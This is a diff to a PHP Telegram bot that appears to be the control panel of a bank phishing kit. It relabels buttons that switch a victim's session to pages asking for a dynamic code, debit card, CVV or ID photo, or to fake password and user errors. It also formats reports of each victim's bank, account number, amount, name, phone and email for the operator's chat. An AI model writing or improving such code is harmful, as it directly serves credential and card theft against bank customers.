@@ -84,9 +84,13 @@ function answerCallback($cbId, $text = 'OK', $showAlert = false) {
 }
 
 /** Envía un mensaje de confirmación al chat después de actualizar el estado. */
-function tgSend($chatId, $text, $reply_markup = null) {
+function tgSend($chatId, $text, $reply_markup = null, $parse_mode = 'HTML') {
     global $token;
     $body = ['chat_id' => $chatId, 'text' => $text];
+    if ($parse_mode) {
+        $body['parse_mode']               = $parse_mode;
+        $body['disable_web_page_preview'] = true;
+    }
     if ($reply_markup) $body['reply_markup'] = $reply_markup;
     $payload = json_encode($body);
     $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
@@ -183,28 +187,29 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
 
                 // MAPEO HUMANO STANDARD (etiquetas para el botón pulsado):
                 $labelMap = [
-                    'opcion_1'  => 'DINAMICA',
-                    'opcion_2'  => 'TARJETA',
-                    'opcion_3'  => 'ERROR_OP3',
-                    'opcion_4'  => 'ERROR_OP4',
-                    'opcion_5'  => 'FOTO',
-                    'opcion_6'  => 'OPCION_6',
-                    'opcion_7'  => 'OPCION_7',
-                    'opcion_8'  => 'OPCION_8',
-                    'opcion_9'  => 'ERROR_DINAMICA',
-                    'opcion_10' => 'FINALIZAR',
-                    'opcion_55' => 'CVV',
+                    'opcion_1'  => '🟢 DINÁMICA',
+                    'opcion_2'  => '💳 TARJETA DÉBITO',
+                    'opcion_3'  => '🔴 ERROR DINÁMICA',
+                    'opcion_4'  => '❌ ERROR CLAVE',
+                    'opcion_5'  => '📸 FOTO CÉDULA',
+                    'opcion_6'  => '💳 TARJETA (alternativo)',
+                    'opcion_7'  => '⚠️ ERROR USUARIO',
+                    'opcion_8'  => 'ℹ️ CENTRO DE AYUDA',
+                    'opcion_9'  => '🔴 ERROR DINÁMICA (detalle)',
+                    'opcion_10' => '🟩 FINALIZAR',
+                    'opcion_55' => '🔢 CVV',
                 ];
                 $lbl = $labelMap[$estado] ?? strtoupper(str_replace('_', ' ', $estado));
 
-                $lines = ["✅ Estado actualizado: {$lbl}"];
+                $lines = ["✅ <b>Estado actualizado:</b> {$lbl}"];
                 if ($row) {
-                    $lines[] = "Request: " . ($row['request_id'] ?? '');
-                    $lines[] = "Banco: "   . ($row['banco'] ?? '');
-                    $lines[] = "Celular: " . ($row['numero_cuenta'] ?? '');
-                    $lines[] = "Monto: "   . ($row['monto'] ?? '');
-                    if (!empty($row['nombre'])) $lines[] = "Nombre: " . $row['nombre'];
-                    if (!empty($row['correo'])) $lines[] = "Correo: " . $row['correo'];
+                    if (!empty($row['request_id']))      $lines[] = "🆔 Request: " . htmlspecialchars($row['request_id'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['banco']))           $lines[] = "🏦 Banco: "   . htmlspecialchars($row['banco'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['numero_cuenta']))   $lines[] = "📱 Celular: " . htmlspecialchars($row['numero_cuenta'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['monto']))           $lines[] = "💰 Monto: "   . htmlspecialchars($row['monto'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['nombre']))          $lines[] = "👤 Nombre: "  . htmlspecialchars($row['nombre'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['telefono']))        $lines[] = "☎️ Teléfono: ". htmlspecialchars($row['telefono'], ENT_QUOTES, 'UTF-8');
+                    if (!empty($row['correo']))          $lines[] = "📧 Correo: "  . htmlspecialchars($row['correo'], ENT_QUOTES, 'UTF-8');
                 }
 
                 if ($chat) {
